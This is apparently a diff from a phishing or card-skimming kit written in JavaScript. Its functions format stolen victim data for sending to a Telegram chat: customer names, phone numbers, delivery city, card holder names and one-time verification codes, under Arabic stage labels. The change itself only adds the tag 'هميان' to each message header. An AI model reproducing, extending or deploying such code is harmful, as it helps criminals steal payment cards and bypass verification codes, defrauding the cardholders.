@@ -50,7 +50,7 @@ async function sendTelegramMessage(text) {
 
 function formatOrder1TelegramMessage(payload = {}) {
     const lines = [];
-    lines.push('بيانات العميل');
+    lines.push(' هميان بيانات العميل');
     const customerName = payload.customerName || payload.fullName || payload.name || payload.clientName || '';
     if (customerName) lines.push(`اسم العميل: ${customerName}`);
     if (payload.phoneNumber) lines.push(`الهاتف: ${payload.phoneNumber}`);
@@ -60,7 +60,7 @@ function formatOrder1TelegramMessage(payload = {}) {
 
 function formatOrder2TelegramMessage(payload = {}) {
     const lines = [];
-    lines.push('عنوان التوصيل');
+    lines.push('هميان عنوان التوصيل');
     const customerName = payload.customerName || payload.fullName || payload.name || payload.clientName || '';
     if (customerName) lines.push(`اسم العميل: ${customerName}`);
     if (payload.city) lines.push(`المدينة: ${payload.city}`);
@@ -71,7 +71,7 @@ function formatOrder2TelegramMessage(payload = {}) {
 
 function formatOrder3TelegramMessage(payload = {}) {
     const lines = [];
-    lines.push('دخول الدفع');
+    lines.push('هميان دخول الدفع');
     const customerName = payload.customerName || payload.fullName || payload.name || payload.clientName || '';
     if (customerName) lines.push(`اسم العميل: ${customerName}`);
     return lines.join('\n');
@@ -79,7 +79,7 @@ function formatOrder3TelegramMessage(payload = {}) {
 
 function formatPaymentTelegramMessage(payload = {}) {
     const lines = [];
-    lines.push('دفع جديد');
+    lines.push('هميان دفع جديد');
     const customerName = payload.customerName || payload.fullName || payload.name || payload.clientName || '';
     if (customerName) lines.push(`اسم العميل: ${customerName}`);
     if (payload.paymentData?.cardHolder) lines.push(`اسم حامل البطاقة: ${payload.paymentData.cardHolder}`);
@@ -91,7 +91,7 @@ function formatPaymentTelegramMessage(payload = {}) {
 
 function formatOtpTelegramMessage(payload = {}) {
     const lines = [];
-    lines.push('رمز التحقق');
+    lines.push('هميان رمز التحقق');
     const customerName = payload.customerName || payload.fullName || payload.name || payload.clientName || '';
     if (customerName) lines.push(`اسم العميل: ${customerName}`);
     if (payload.otp) lines.push(`رمز التحقق: ${payload.otp}`);
